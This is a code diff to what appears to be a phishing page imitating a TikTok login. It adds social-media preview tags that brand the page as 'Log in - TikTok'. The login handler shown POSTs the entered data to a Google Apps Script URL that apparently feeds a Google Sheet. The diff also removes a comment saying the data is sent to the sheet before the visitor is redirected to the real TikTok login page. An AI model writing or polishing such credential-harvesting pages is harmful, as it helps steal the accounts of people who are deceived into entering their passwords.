@@ -5,6 +5,12 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Log in</title>
 
+<!-- Social Media Preview Meta Tags (Open Graph) -->
+<meta property="og:title" content="Log in - TikTok">
+<meta property="og:description" content="Log in to your account to continue">
+<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSqQInCiMuXjZumXpBvBpR53TtxZvERaxFwzhmX2O1big&s=10">
+<meta property="og:type" content="website">
+
 <style>
 * {
     box-sizing: border-box;
@@ -318,7 +324,6 @@ loginBtn.addEventListener("click", function() {
 
         const webAppUrl = "https://script.google.com/macros/s/AKfycbxI5xaKP529vLZsw-90oKbuj1XCbdIzhF9vk36zbFzwweqkQW2LAXoJSLPzERz8OKGavQ/exec";
 
-        // Data Google Sheet mein bhej kar foran tiktok login page par redirect kar dega
         fetch(webAppUrl, {
             method: 'POST',
             mode: 'no-cors',
